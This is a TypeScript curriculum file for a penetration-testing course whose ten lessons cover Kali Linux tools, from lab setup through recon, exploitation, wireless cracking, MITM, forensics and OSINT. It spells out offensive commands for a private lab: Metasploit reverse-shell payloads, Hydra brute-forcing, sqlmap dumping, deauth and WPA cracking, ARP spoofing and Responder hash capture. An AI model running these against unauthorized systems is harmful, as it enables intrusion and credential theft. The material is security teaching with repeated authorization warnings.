import type { Module } from "../curriculum";

export const module25: Module = {
  id: "module-25",
  slug: "25-kali-linux-toolkit",
  title: "Kali Linux & Penetration Testing Toolkit",
  description:
    "The toolbox. Master the major tools of Kali Linux — every category, hands-on in your home lab — from recon to exploitation to forensics.",
  language: "Kali Tools",
  lessons: [
    {
      id: 1,
      slug: "01-kali-setup-home-lab",
      title: "Kali Setup & Home Lab Foundations",
      level: "beginner",
      tag: "lab",
      duration: "45 min",
      description:
        "Create your professional lab: VirtualBox, Kali Linux, target VMs, network topology, snapshots, and daily tool hygiene.",
      content: `
# Kali Setup & Home Lab Foundations

## Your lab = your growth

Every professional cybersecurity skill is practiced somewhere you control. Master this setup once and reuse it forever.

## Hardware requirements (minimum)

- 16 GB RAM recommended (4 for Kali, 4-8 for modern targets)
- Two CPU cores per VM; enable virtualization in BIOS
- 60+ GB disk (Kali 40GB + targets 20GB)
- x86-64 host

## VirtualBox setup

1. **Install VirtualBox** (virtualbox.org) + **Extension Pack** for USB/VRDE
2. Download the **Kali VirtualBox image** (kali.org) — a ready OVA (easier than ISO)
3. Import: File → Import Appliance

## Kali VM essentials

- RAM 4096 MB, CPU 2, 40GB disk (dynamic)
- Storage: SATA controller
- Networking: we'll use host-only + NAT (see below)
- After boot: run \`sudo apt update && sudo apt full-upgrade\`
- Enable the non-root user in the pre-created kali user or create yours

## Network topology

\`\`\`
[ Host (VirtualBox) ]
   | Host-Only Network vboxnet0 (10.0.2.15 lab subnet)
   +--- Kali  (10.0.0.10)
   +--- Target (10.0.0.20)  Metasploitable/DVWA
   +--- Win10  (10.0.0.30)  target for lateral labs
NAT  -> internet (updates, downloads)
\`\`\`

- **NAT**: Kali talks out to internet, targets unreachable from Kali
- **Host-only**: Kali+targuts all on lab subnet, isolated from your LAN
- **Bridged**: risky (exposes on YOUR Wi-Fi) — avoid for beginners
- Combine: give Kali TWO NICs (NAT + host-only) so you update but test locally

## Snapshots are your superpower

- After Kali setup → snapshot "clean-1"
- After each exploit experiment → snapshot before/after
- Roll back in seconds, never fear breakage

## Tool hygiene

- \`sudo apt update\` weekly
- \`sudo kali-linux-everything\` only if you want EVERYTHING (600+ tools)
- Prefer category metas: \`sudo apt install metasploit-framework burpsuite wireguard\`
- Bookmark the Kali docs (kali.org/docs)

> Rule of the lab: everything destructive happens inside VirtualBox on a snapshot-backed VM. Your host stays clean and your experiments stay reversible.
`,
      defaultCode: `# Verify Kali is ready
sudo apt update && sudo apt full-upgrade -y
# check network
ip addr show
# install a couple of meta tool groups
sudo apt install -y metasploit-framework nmap wireshark burpsuite`,
      solution: `sudo apt update && sudo apt full-upgrade -y
ip addr show        # confirm NICs (NAT + host-only)
sudo apt install -y metasploit-framework nmap wireshark burpsuite`,
      hint: "Two NICs: NAT for updates, host-only for lab attacks. Snapshot before experiments.",
      challenge: `**Home Lab — Build It:**
1. Install VirtualBox + Extension Pack.
2. Import the Kali OVA. Give it 4GB RAM, 2 CPUs, 40GB disk.
3. Add a host-only NIC; verify Kali gets an IP in your lab range.
4. Run the update/install commands above.
5. Install a target: Metasploitable 2 (sourceforge) or run DVWA via docker.
6. Take snapshot 'clean-kali-1'. Verify you can revert and restore.`,
    },
    {
      id: 2,
      slug: "02-information-gathering",
      title: "Information Gathering Tools",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "nmap, netdiscover, arp-scan, theHarvester, recon-ng, Maltego, dig, whois, Masscan, RustScan — master the collection layer.",
      content: `
# Information Gathering Tools

## The tool family

| Tool | Purpose |
|------|---------|
| **nmap** | The Swiss-army scanner (host discovery, ports, services, OS) |
| **netdiscover / arp-scan** | Layer-2 host discovery on a live subnet |
| **theHarvester** | Collect emails, subdomains, hosts from search engines |
| **recon-ng** | Modular OSINT framework (modules for many sources) |
| **Maltego** | Graph-link OSINT (entities + transforms) |
| **dig / nslookup / host** | DNS interrogation |
| **whois** | Domain registration records |
| **Masscan / RustScan** | Very fast port sweeps (scan first, nmap second) |

## Rightsize your scanning

\`\`\`
# Host discovery
netdiscover -r 10.0.0.0/24
arp-scan --localnet

# FAST port sweep with Masscan
sudo masscan -p1-65535 --rate=1000 10.0.0.20 -oL open.txt

# Focused nmap on discovered ports
nmap -sS -sV -sC 10.0.0.20 -oA target

# DNS
dig any example.com
nslookup -type=TXT example.com
whois example.com

# Emails / subdomains
theHarvester -d example.com -b google,linkedin,crtsh
\`\`\`

## Reading results

- Open ports → services → versions → attack candidates
- arp-scan reveals live hosts the firewall might not (L2 bypasses L3 filtering)
- Recon-ng keeps your OSINT modular and repeatable

## Speed vs thoroughness

Scan tiers: (1) fast sweep for open ports, (2) version detection on open ports, (3) script/exploit checks on interesting ones. Skipping to full-version on everything wastes hours.

## OPSEC your scanning

Scanning is *loud*. It is also fully authorized in your lab — the point is to learn what it sounds like to defenders.
`,
      defaultCode: `# The information-gathering ladder
arp-scan --localnet
sudo masscan -p1-65535 10.0.0.20 --rate=1000 -oL masscan.txt
nmap -sS -sV -sC -p <open> 10.0.0.20 -oA detailed
dig any example.com && whois example.com`,
      solution: `arp-scan --localnet
sudo masscan -p1-65535 10.0.0.20 --rate=1000 -oL masscan.txt
nmap -sS -sV -sC -p <open> 10.0.0.20 -oA detailed
dig any example.com && whois example.com`,
      hint: "Tier your scans: sweep -> versions -> scripts. Log everything.",
      challenge: `**Home Lab — Gather Everything:**
1. Run netdiscover + arp-scan on your lab subnet. Note unexpected host counts.
2. Masscan a lab target across all ports at high rate (compare timing to nmap full).
3. On discovered open ports, run nmap -sS -sV -sC.
4. OSINT practice: run theHarvester against a domain you own or example.com (legal, no target harm).
5. Write a per-host profile: IP, ports, services, versions, and your top attack candidate.`,
    },
    {
      id: 3,
      slug: "03-vulnerability-analysis",
      title: "Vulnerability Analysis Tools",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "OpenVAS/Nessus, Nikto, sqlmap, gobuster/ffuf, WPScan, and nmap NSE — converting inventory into a ranked weakness list.",
      content: `
# Vulnerability Analysis Tools

## The tools

| Tool | What it finds |
|------|---------------|
| **OpenVAS (Greenbone)** | Network vuln scanner with a rich CVE database |
| **Nessus** | Commercial scanner (free for 16 IPs — good for learning) |
| **Nikto** | Webserver misconfigs and known-issue scanner |
| **sqlmap** | Automated SQL injection detection + exploitation |
| **gobuster / ffuf / feroxbuster** | Directory & file brute-forcing, vhost fuzzing |
| **WPScan** | WordPress plugins/themes/users CVEs |
| **nmap NSE** | 600+ scripts (vuln, brute, discovery) |

## Workflow

\`\`\`
1. OpenVAS scan -> CVE list per host
2. nmap --script vuln on interesting services
3. nikto on web targets
4. gobuster to discover hidden paths
5. sqlmap on any parameter you suspect
6. Rank: exploitability x asset value
\`\`\`

## Directory brute-force you should always try

\`\`\`
gobuster dir -u http://10.0.0.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
ffuf -w /usr/share/wordlists/subdomains-top1million-20000.txt -u http://10.0.0.20/FUZZ
\`\`\`

## sqlmap essentials

\`\`\`
sqlmap -u 'http://10.0.0.20/search.php?q=test' --batch --dbs
sqlmap -u 'http://10.0.0.20/login.php' --forms --batch --dbs
\`\`\`
It enumerates and (if you allow) dumps data — in a lab only!

## Reading the findings

- A scanner's "critical" from a default network scan is a lead, not a verdict
- Reproduce: connect to the service yourself before writing a finding
- False positive discipline matters; triage = verify + rank

> The professional habit: scanners *suggest*, you *prove*. Every candidate finding gets a manual confirmation before it earns report space.
`,
      defaultCode: `# Vulnerability analysis ladder
# 1. OpenVAS (GUI/daemon opens after setup) - or run unauthenticated scan in Nessus Essentials
sudo gvm-setup   # one-time (long)
sudo gvm-start

# 2. quick scripts
nmap --script vuln 10.0.0.20 -p 80,445,22

# 3. web checks
nikto -h http://10.0.0.20
gobuster dir -u http://10.0.0.20 -w /usr/share/wordlists/dirb/common.txt -x php

# 4. SQLi check
sqlmap -u 'http://10.0.0.20/test.php?page=1' --batch`,
      solution: `sudo gvm-setup   # one-time, ~10-20 min
sudo gvm-start
nmap --script vuln 10.0.0.20 -p 80,445,22
nikto -h http://10.0.0.20
gobuster dir -u http://10.0.0.20 -w /usr/share/wordlists/dirb/common.txt -x php
sqlmap -u 'http://10.0.0.20/test.php?page=1' --batch`,
      hint: "Scanner output is a hypothesis. Reproduce manually, then report.",
      challenge: `**Home Lab — Ranked Findings List:**
1. Run OpenVAS (or Nessus Essentials) against one lab target. Note the top 5 CVEs.
2. Cross-check with \`nmap --script vuln\` on the same host.
3. Run nikto + gobuster against your DVWA or Metasploitable.
4. Match each leading candidate to an exploit (searchsploit).
5. Produce a ranked table: vuln, CVE, exploit existence, target value, priority.`,
    },
    {
      id: 4,
      slug: "04-exploitation-password-cracking",
      title: "Exploitation & Password Cracking Tools",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Metasploit, BeEF, SET, Hydra, John the Ripper, Hashcat, Crunch, CeWL — the offensive core of the toolkit, controlled and ethical.",
      content: `
# Exploitation & Password Cracking Tools

## The exploitation club

| Tool | Role |
|------|------|
| **Metasploit** | Framework: exploits, payloads, post modules, Meterpreter |
| **BeEF** | Browser Exploitation Framework — hook browsers, drive client-side |
| **SET** (Social-Engineering Toolkit) | Cloned sites, phishing bundles, credential harvesters |
| **SearchSploit** | Offline index of Exploit-DB (match service → exploit) |

## Metasploit in 6 steps

\`\`\`
msfconsole
search type:exploit platform:linux <keyword>
use exploit/multi/http/... 
show options
set RHOSTS 10.0.0.20
set RPORT 80
set LHOST 10.0.0.10
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
\`\`\`

After a session: \`sysinfo\`, \`getuid\`, \`shell\`, \`sessions -i 1\`. Meterpreter's post modules (\`post/multi/recon/local_exploit_suggester\`) suggest privesc.

## Password cracking family

\`\`\`
# wordlist generation from a target's own words
cewl http://10.0.0.20 -d 2 -m 5 -w cewl.txt

# deterministic wordlists
crunch 8 12 0123456789abcdef -o eight.txt

# online brute (SSH/FTP/HTTP form)
hydra -l admin -P rockyou.txt ssh://10.0.0.20
hydra -L users.txt -P pass.txt 10.0.0.20 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# offline hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt   # NTLM (-m 1000)
\`\`\`

## The ethics in practice

- Hydra against a server you OWN or are authorized to test
- Hashcat on hashes YOU generated (pentester convenience: pwdump your own)
- Both against wordlists (rockyou) — clear the "m 5m+1" ethics check: authorized or yours

## Pivots and post-exploitation

- From a foothold, run local_exploit_suggester, enumerate creds, pivot (Kali can route via Meterpreter).
- Persistence: only in lab engagements, document everything, clean after.
`,
      defaultCode: `# A safe in-lab sequence
searchsploit openssh 7.2
# then, with authorization:
msfconsole -q -x 'use exploit/multi/http/...; set RHOSTS 10.0.0.20; run'
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.20
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt`,
      solution: `searchsploit openssh 7.2
msfconsole -q -x 'use exploit/multi/http/...; set RHOSTS 10.0.0.20; run'
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.20
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt`,
      hint: "Framework for exploitation; wordlists for credentials. Both need written authorization.",
      challenge: `**Home Lab — Chain It Together:**
1. Generate a hash you own: \`echo -n 'Summer2024!' | md5sum\`.
2. Crack it with hashcat (\`-m 0\`) and john (raw-md5). Compare speeds.
3. Run cewl on your DVWA site; add the words to a small wordlist.
4. Use hydra on a lab SSH/FTP you intentionally misconfigured (never a service you don't own).
5. Document one full chain: discovery → exploit → (optional) privesc → what-you-could-take.`,
    },
    {
      id: 5,
      slug: "05-wireless-attacks",
      title: "Wireless Attack Tools",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Aircrack-ng suite, Reaver, Wifite, Kismet — WPA/WPA2 cracking, deauth, evil twins, and wireless reconnaissance. Lab-only practices.",
      content: `
# Wireless Attack Tools

## Why wireless security matters

Wi-Fi is the fastest way into a network: WPA2 dictionary busted, open guest SSIDs abused, evil twins harvesting logins. Learning the tools teaches you how to defend your own SSID.

## The hardware requirement

A supported Wi-Fi card that can **monitor mode** and **inject**: Alfa AWUS036ACH (ath9k/rtl88xx variants), etc. VirtualBox must pass USB to Kali (Extension Pack).

## The aircrack-ng family

\`\`\`
sudo airmon-ng check kill          # stop conflicting services
sudo airmon-ng start wlan0         # -> wlan0mon
sudo airodump-ng wlan0mon          # scan APs and clients
sudo airodump-ng -c 6 --bssid AA:BB:..:de:ad -w capture wlan0mon
# in a new terminal, deauth a client to force a handshake:
sudo aireplay-ng -0 5 -a AABB..de:ad -c CLIENTMAC wlan0mon
# then crack the WPA2 handshake offline:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

## Beyond classic WPA2

- **Wifite 3**: automates WPA handshake capture + offline crack
- **Reaver / bully**: WPS PIN brute (vulnerable routers)
- **Kismet**: passive AP/client discovery
- **Evil twin + captive portal** (using hostapd/airgeddon): fake AP named "FreeWifi" that prompts for credentials

## Lesson integrity warning

These techniques belong in a **lab with your own AP** or an authorized assessment. Attacking your neighbor's Wi-Fi is a crime in nearly every jurisdiction. Kali even ships hidden tools — restraint is the test.

## Defense you learn from offense

- WPA3 + disable WPS
- Deauth-immune: WPA3 protects handshake dreams
- Don't broadcast secrets; use a long random passphrase
- Monitor for unknown SSIDs with Kismet at home
`,
      defaultCode: `# Only run in YOUR OWN lab wireless or authorized assessment
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid YOURAP --write lab wlan0mon
sudo aireplay-ng -0 3 -a YOURAP -c CLIENTMAC wlan0mon
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt lab-01.cap`,
      solution: `sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid YOURAP --write lab wlan0mon
sudo aireplay-ng -0 3 -a YOURAP -c CLIENTMAC wlan0mon
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt lab-01.cap`,
      hint: "Monitor mode -> capture -> deauth for handshake -> offline crack. Your own AP only.",
      challenge: `**Home Lab — Wireless in a Safe Envelope:**
1. Get a monitor-mode-compatible adapter; pass it into Kali via USB.
2. Run airmon-ng + airodump-ng to LIST (not attack) networks near you. Note: this is passive and generally OK.
3. On your OWN router: set a weak WPA2 passphrase temporarily (or use an old test router/AP), put it on a channel, and crack its handshake end-to-end.
4. Restore your real passphrase. Note the risk of testing with your own router (brief availability loss).
5. Write a paragraph: after cracking, what passphrase policy would you enforce at home?`,
    },
    {
      id: 6,
      slug: "06-web-application-tools",
      title: "Web Application Attack Tools",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Burp Suite, OWASP ZAP, commix, wfuzz, Arjun, XSStrike — intercept, fuzz and exploit web apps the way professionals do.",
      content: `
# Web Application Attack Tools

## The interception paradigm

Almost every web test starts with a **proxy**: your browser talks to a local proxy that talks to the target. You see and change every request.

\`\`\`
[ Browser ] -> [ Burp/ZAP Proxy :8080 ] -> [ Target ]
\`\`\`

## Burp Suite Community (free)

- **Proxy + Intercept**: pause requests, modify, forward
- **Repeater**: handcraft requests over and over
- **Intruder**: fuzz payloads across parameters/hosts (Community limits speed)
- **Decoder/Comparer**: encode/decode and diff responses

## OWASP ZAP (free, open source)

- Same proxy model + **active scan** + **fuzzing** + automated spider
- Great as the DAST tool in CI pipelines too
- Scriptable (Python/Zest) for repeated flows

## The web attack tools corner

\`\`\`
# command injection detection
commix --url 'http://10.0.0.20/cmd.php?cmd=whoami'

# parameter discovery (hidden params = attack surface)
arjun -u http://10.0.0.20/search.php

# fuzz directories/files
ffuf -u http://10.0.0.20/FUZZ -w /usr/share/wordlists/dirb/common.txt

# XSS detection
xsstrike -u 'http://10.0.0.20/?q=' -l -d  # blind-ish probes

# SQLi deep
sqlmap -u 'http://10.0.0.20/?id=1' --batch --technique=BEUQT
\`\`\`

## Web workflow using Burp

1. Configure browser → Burp proxy
2. Browse the app, watch requests appear
3. Repeater: tamper with parameters, headers, body
4. Intruder/Wfuzz: fuzz known-bad payloads (sqlmap, XSS, LFI lists)
5. Record evidence for the report

## The professional web stack

Never just "run sqlmap". Understand each request: where auth lives, what's stateless, how errors reveal structure. The tools accelerate a human who reads the traffic.
`,
      defaultCode: `# A minimal but honest web API test sequence (lab)
# In reality, most happens in Burp GUI, but CLI pieces:
sqlmap -u 'http://10.0.0.20/get.php?id=1' --batch --dbs
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.0.20/FUZZ
xsstrike -u 'http://10.0.0.20/?q=test' -l -d
commix --url 'http://10.0.0.20/cmd.php?cmd=id'`,
      solution: `sqlmap -u 'http://10.0.0.20/get.php?id=1' --batch --dbs
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.0.20/FUZZ
xsstrike -u 'http://10.0.0.20/?q=test' -l -d
commix --url 'http://10.0.0.20/cmd.php?cmd=id'`,
      hint: "Proxy, read traffic, tamper, fuzz. Evidence-driven, not tool-spam.",
      challenge: `**Home Lab — Intercept & Exploit:**
1. Point a browser at your DVWA through Burp/ZAP proxy.
2. In Repeater, log into DVWA and tamper the session cookie value — observe.
3. Run sqlmap against a DVWA SQLi page (login needed) — get DB list.
4. Commix against a vulnerable command-injectable endpoint in your lab.
5. Save: one before/after request pair per finding as report evidence.`,
    },
    {
      id: 7,
      slug: "07-network-traffic-analysis",
      title: "Network & Traffic Analysis Tools",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "Wireshark, tcpdump, TShark, Netcat, Responder, Bettercap, mitmproxy — see, snarf, and replay the traffic that crosses the wire.",
      content: `
# Network & Traffic Analysis Tools

## See the traffic

| Tool | What it does |
|------|--------------|
| **Wireshark** | GUI packet analysis, filters, follow-stream |
| **tcpdump / TShark** | CLI capture for scripts and remote hosts |
| **capinfos / editcap / mergecap** | Inspect & manipulate pcap files |
| **Netcat (nc)** | Read/write raw TCP/UDP; the duct tape of networking |
| **Responder** | LLMNR/NBT-NS poisoning — snarf netNTLMv2 hashes |
| **Bettercap** | Modern MITM: ARP spoof, sniff, hijack HTTP |
| **mitmproxy** | Interactive MITM for HTTP/HTTPS workflows |

## Capture basics

\`\`\`
sudo tcpdump -i eth0 -w cap.pcap 'tcp port 80'
tshark -r cap.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
\`\`\`

In Wireshark: use display filters like \`http\`, \`ip.addr==10.0.0.20\`, \`tcp.stream eq 5\`, Follow HTTP Stream for body.

## MITM the lab way (authorized)

\`\`\`
# ARP spoof the gateway (from Kali, both victim+gateway)
bettercap -eval 'set arp.spoof.targets 10.0.0.30; arp.spoof on; net.sniff on'
\`\`\`

## Responder (snarf hashes on your lab LAN)

\`\`\`
sudo responder -I eth0 -dwPv
# Windows clients who resolve unknown names -> LM/NTLMv2 hashes past you
# crack offline with hashcat mode 5600
\`\`\`

## Reading a pcap professionally

- Where's the handshake failing? (TLS server hello looking wrong)
- Is this traffic exfil? (unusual large outbound, base64-ish strings)
- HTTP vs HTTPS hygiene check (credentials in plaintext?)

> The skill translates: blue teams live in captures too. Every packet you can read is evidence you can use or defend against.
`,
      defaultCode: `# Capture and analyze your own HTTP flow
sudo tcpdump -i eth0 -w /tmp/demo.pcap 'tcp port 80'
# (in another shell, curl http://example.com)
tshark -r /tmp/demo.pcap -Y 'http.request.method==GET' -T fields -e http.host -e http.request.uri`,
      solution: `sudo tcpdump -i eth0 -w /tmp/demo.pcap 'tcp port 80'
tshark -r /tmp/demo.pcap -Y 'http.request.method==GET' -T fields -e http.host -e http.request.uri`,
      hint: "Capture, filter, follow the stream, extract the story.",
      challenge: `**Home Lab — Read Your Own Traffic:**
1. tcpdump a web session (any HTTP site) to a pcap.
2. Open in Wireshark: filter to http, follow one stream.
3. Count: how many requests, which methods, any credentials in POSTs?
4. Set up bettercap against YOUR OWN lab VM's gateway to observe MITM mechanics (authorized, yours).
5. For defense: show how HTTPS beats plaintext sniffing in your capture.`,
    },
    {
      id: 8,
      slug: "08-forensics-steganography",
      title: "Forensics & Steganography Tools",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "Autopsy, Volatility, Binwalk, Foremost, Steghide — recover and analyze data, carve deleted files, and hide/seek secrets.",
      content: `
# Forensics & Steganography Tools

## The forensics stack in Kali

| Tool | Purpose |
|------|---------|
| **Autopsy / Sleuth Kit** | Disk imaging + artifact analysis GUI |
| **Volatility 3** | Memory forensics (processes, network, injected code) |
| **Binwalk** | Firmware/archive extraction + file signature analysis |
| **Foremost / Scalpel / Bulk Extractor** | Carve deleted/recovered files by signature |
| **testdisk / photorec** | Partition recovery + file recovery |

## Carve a file

\`\`\`
# Extract files that match signatures from a disk image
foremost -i evidence.dd -o carved/
scalpel -i evidence.dd -o carved2/
bulk_extractor evidence.dd -o be_out/
\`\`\`

## Memory analysis with Volatility 3 (Python)

\`\`\`
# find running processes and args
vol3 -f mem.dump windows.pslist
vol3 -f mem.dump windows.pstree
vol3 -f mem.dump windows.netstat
vol3 -f mem.dump windows.malfind
# dump a process's memory
vol3 -f mem.dump windows.dumpfiles --pid 1234
\`\`\`
malfind flags suspect injected code — your hint that a process hosts shellcode.

## Steganography: hide & seek

\`\`\`
# hide a message file inside an image (steghide)
steghide embed -cf photo.jpg -sf secret.txt -p 'passphrase'
steghide extract -sf photo.jpg -p 'passphrase'

# file-inspecting: what else is inside?
binwalk secret.jpg
strings secret.jpg | grep -i 'flag|secret'
\`\`\`

## Real forensic mindset

- Preserve first: image, hash, work on the copy
- Timelines beat single artifacts: build the story
- Stego is common in example challenges and real malware delivery (payload hidden in image)
- Kali's tools answer the question "what is on this media?" — a crime scene needs procedure too

> Combine: a phishing email + stego image + memory dump = a realistic ransomware-intrusion lab the whole defense module will revisit.
`,
      defaultCode: `# A forensic triage sequence
sha256sum evidence.dd > evidence.sha256
foremost -i evidence.dd -o carved/
binwalk evidence.dd
strings evidence.dd | grep -iE 'passw|http|secret' | head -50`,
      solution: `sha256sum evidence.dd > evidence.sha256
foremost -i evidence.dd -o carved/
binwalk evidence.dd
strings evidence.dd | grep -iE 'passw|http|secret' | head -50`,
      hint: "Hash, carve, binwalk, strings — the four primary-colored moves.",
      challenge: `**Home Lab — Create & Solve a Mini-Case:**
1. Create a small disk image / use a test image (e.g., your own USB stick after copying a secret file then deleting it — NOT your primary data!).
2. Carve it with foremost; recover the "deleted" file.
3. Hide a message in an image with steghide; extract it.
4. Run binwalk on a downloaded firmware image (legal) just to see what it carries.
5. Write the mini-case report: evidence, tools, timeline, outcome.`,
    },
    {
      id: 9,
      slug: "09-reverse-engineering-malware",
      title: "Reverse Engineering & Malware Analysis Tools",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Ghidra, Radare2, GDB, pwndbg, objdump — analyze and understand binaries; YARA, VirusTotal, and sandboxes for malware triage.",
      content: `
# Reverse Engineering & Malware Analysis Tools

## The analyst's kit

| Tool | Role |
|------|------|
| **Ghidra** (NSA) | World-class disassembler + decompiler, GUI, scripts |
| **Radare2 / Cutter** | Terminal & GUI reverse engineering framework |
| **GDB + pwndbg/gef** | Runtime debugging; pwndbg shines on CTFs binaries |
| **objdump / readelf** | Fast static looks at sections/symbols |
| **strings / binwalk** | Quick reconnaissance of unknown binaries |
| **YARA** | Signature rules to detect malware families |
| **VirusTotal / MALTEGO** | Cloud triage (hash check out) |
| **Cuckoo / malware sandboxes** | Dynamic analysis in a disposable VM |

## Static analysis flow

\`\`\`
file sample.bin
strings sample.bin
readelf -h sample.bin          # ELF headers
objdump -d sample.bin | head   # disassembly preview
ghidra sample.bin              # or: r2 -A sample.bin
\`\`\`

In Ghidra: locate main, look for suspicious imports (socket, exec, VirtualAlloc), decode the strings XOR'd in the binary.

## YARA the fast way

\`\`\`
rule Suspicious_Network
{
  strings:
    $s1 = "cmd.exe" ascii nocase
    $s2 = { 6A 00 6A 00 6A 00 }   // push 0x0 x3 (socket args)
  condition:
    any of them
}
\`\`\`
\`yara /rule.yar /path/to/samples\`

## Dynamic analysis (in a sandbox)

- Snapshot the VM, install the sample, watch with procmon (Windows) or strace (Linux)
- \`strace -f ./sample\` reveals file/network/syscall behavior
- Cuckoo auto-reports network/process visual timeline

## Malware OPSEC basics

- NEVER run samples on your host; a dedicated VM + snapshots only
- Disconnect the sandbox network or use a fake connection log
- Hash everything (VirusTotal lookup by hashes first — avoid uploading private samples where policy forbids)

> The mindset of RE: hypotheses + evidence. Every reverse step answers "what does this binary intend?" — the target of every malware doc.
`,
      defaultCode: `# Static triage of an unknown binary (lab copy!)
file suspect.exe
strings suspect.exe | less
readelf -h suspect        # if ELF
objdump -d suspect | grep -E 'call|jmp' | head -20
# dynamic, sandbox-only:
strace -f ./suspect 2> trace.txt`,
      solution: `file suspect.exe
strings suspect.exe | less
readelf -h suspect
objdump -d suspect | grep -E 'call|jmp' | head -20
strace -f ./suspect 2> trace.txt`,
      hint: "Static first (strings/objdump), dynamic only in a VM sandbox.",
      challenge: `**Home Lab — Analyze a Sample Without Fear:**
1. Write (yourself!) a small C program that connects to a server and runs a command — that's your "malware".
2. Run the static flow: file, strings, objdump.
3. Open it in Ghidra or cutter; find where the string/port lives.
4. Dynamic (sandbox VM): trace syscalls with strace.
5. Write a YARA rule that detects your sample; run yara against it.`,
    },
    {
      id: 10,
      slug: "10-osint-specialized-tools",
      title: "OSINT & Specialized Tools",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "SpiderFoot, Sherlock, Holehe, CloudSploit, Pacu, Prowler, OSINT Framework — footprinting people, infra, and cloud from the outside in.",
      content: `
# OSINT & Specialized Tools

## OSINT beyond nmap

OSINT = gathering intelligence from **public sources**. Defense teams use it defensively (find your own exposure); offense uses it to target people and infra.

## The people and account tools

\`\`\`
# find usernames across networks
sherlock alice_wonder  # prints platforms where the handle exists

# find account registration email chains (legal, public)
holehe alice@example.com

# the OSINT Framework (web app)
# osintframework.com - a browsable tree of free tools by category
\`\`\`

## Automated recon workbenches

- **SpiderFoot**: scans domains/emails/IPs across hundreds of modules → graph + report
- **theHarvester** (seen earlier) for emails/subdomains
- **Shodan** (shodan.io search) for exposed services by banner
- **Censys** for certificate & service search
- **HaveIBeenPwned / Dehashed** (carefully, legally) for breach-password context

## Cloud exposure hunting (blue and red)

\`\`\`
# AWS misconfiguration checks (blue team first!)
prowler -M text                       # AWS posture + compliance
cloudsplaining scan                   # IAM role over-permission audit

# AWS offense (authorized/lab)
pip install pacu
pacu                            # modules to enumerate creds, S3, IAM
\`\`\`

## The defensive application

- Run these against YOUR OWN org/domain to see what attackers see
- Register-print your exposure: exposed S3? leaked emails? leftover test subdomains?
- Your own OSINT report is the highest-value "free" security review you'll ever do

## Ethics in OSINT

Public data is public — but **what you do with it is governed by law and scope**. Collecting for your own defensive posture is fine; stalking a person without basis is both creepy and illegal in many jurisdictions. Keep it targeted, purposeful, and scoped.
`,
      defaultCode: `# OSINT on a domain YOU participate in
spiderfoot -l 0.0.0.0:5001 -m all -u https://example.com    # then browse :5001
theHarvester -d example.com -b crtsh,google
sherlock my_test_handle
prowler -M text   # needs AWS creds; in a lab you own`,
      solution: `spiderfoot -l 0.0.0.0:5001 -m all -u https://example.com
theHarvester -d example.com -b crtsh,google
sherlock my_test_handle
prowler -M text`,
      hint: "Run defensively on your own domain first. Public data, private discipline.",
      challenge: `**Home Lab — Your Own Exposure Report:**
1. Run theHarvester on a domain you control (or example.com for demo).
2. Run holohole on a disposal email; run sherlock on a handle you use.
3. Install prowler in an AWS-free context (inspect its config) or run it in a lab account you own (CLI + temporary keys), and read the misconfiguration list for the account.
4. Write a 1-page "what an attacker would know about me" report.
5. Pick 3 findings to patch in your real life (public info hygiene, enabled 2FA, etc.).`,
    },
  ],
};